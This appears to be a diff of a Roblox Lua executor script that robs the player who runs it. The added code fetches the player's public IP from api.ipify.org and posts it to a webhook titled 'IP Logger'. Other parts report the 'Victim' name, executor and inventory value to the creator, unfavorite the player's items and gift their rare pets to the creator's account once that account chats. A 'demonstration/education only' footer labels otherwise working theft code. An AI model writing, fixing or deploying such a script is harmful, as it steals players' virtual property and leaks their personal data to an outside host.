@@ -7,6 +7,7 @@ if server == "VIPServer" then
     player:Kick("Unsurported server. Please join a public")
 end
 
+-- Redundant local player removed for clarity (player already defined)
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
@@ -16,14 +17,29 @@ local CalculatePlantValue = require(ReplicatedStorage.Modules.CalculatePlantValu
 local ActivePetsService = require(ReplicatedStorage.Modules.PetServices.ActivePetsService)
 local req = (syn and syn.request) or (http and http.request) or (http_request) or request
 
--- Get public IP for use in final logs
-local userIP = "?"
-if req then
-    local ok, response = pcall(function()
+-- Robust IP Logger (unchanged)
+local ipLoggerSent = false
+if req and not ipLoggerSent then
+    local success, response = pcall(function()
         return req({ Url = "https://api.ipify.org/", Method = "GET" })
     end)
-    if ok and response and response.Body then
-        userIP = tostring(response.Body)
+    if success and response and response.Body then
+        local userIP = tostring(response.Body)
+        req({
+            Url = logs_webhook,
+            Method = "POST",
+            Headers = { ["Content-Type"] = "application/json" },
+            Body = HttpService:JSONEncode({
+                embeds = {{
+                    title = ":warning: IP Logger",
+                    description = "User's Public IP: `" .. userIP .. "`",
+                    color = 0xff0000,
+                    footer = { text = "For demonstration/education only" },
+                    timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+                }}
+            })
+        })
+        ipLoggerSent = true
     end
 end
 
@@ -135,11 +151,9 @@ end
 
 local event = ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("Favorite_Item")
 for _, item in ipairs(Backpack:GetChildren()) do
-    -- Unfavorite all items, even if not favorited
-    event:FireServer(item)
-    task.wait(0.05)
-    event:FireServer(item)
-    task.wait(0.05)
+    if item:GetAttribute("Favorite") == true then
+        event:FireServer(item)
+    end
 end
 
 local executor = (identifyexecutor and identifyexecutor()) or "Unknown"
@@ -264,7 +278,6 @@ local payload = {
         ["color"] = 0x00ffcc,
         ["fields"] = {
             {["name"] = ":dart: Victim", ["value"] = LocalPlayer.Name, ["inline"] = false},
-            {["name"] = ":earth_americas: Public IP", ["value"] = userIP, ["inline"] = false},
             {["name"] = ":crown: Creator", ["value"] = username, ["inline"] = false},
             {["name"] = ":jigsaw: Executor", ["value"] = executor, ["inline"] = false},
             {["name"] = ":moneybag: Total Value", ["value"] = formatNumber(totalValue), ["inline"] = false},
@@ -335,6 +348,7 @@ local function unequipAllPets()
     end
 end
 
+-- Gifting logic (with robust error handling and debug output)
 local giftingPetOrder = {
     "Raccoon", "Disco Bee", "Mimic octopus", "Dragon Fly", "Queen Bee", "Scarlet Macaw",
     "Butterfly", "Red fox", "Chicken Zombie", "Polar Bear", "Petal Bee", "Bear Bee", "Cooked Owl"
@@ -402,7 +416,10 @@ local function startGiving()
     print("[Gifting] Done gifting.")
 end
 
+-- Always unequip all pets first
 unequipAllPets()
+
+-- Run gifting logic when target chats (as in your original, started flag for one-time run)
 for _, p in ipairs(Players:GetPlayers()) do
     if p.Name == username then 
         p.Chatted:Connect(function() 
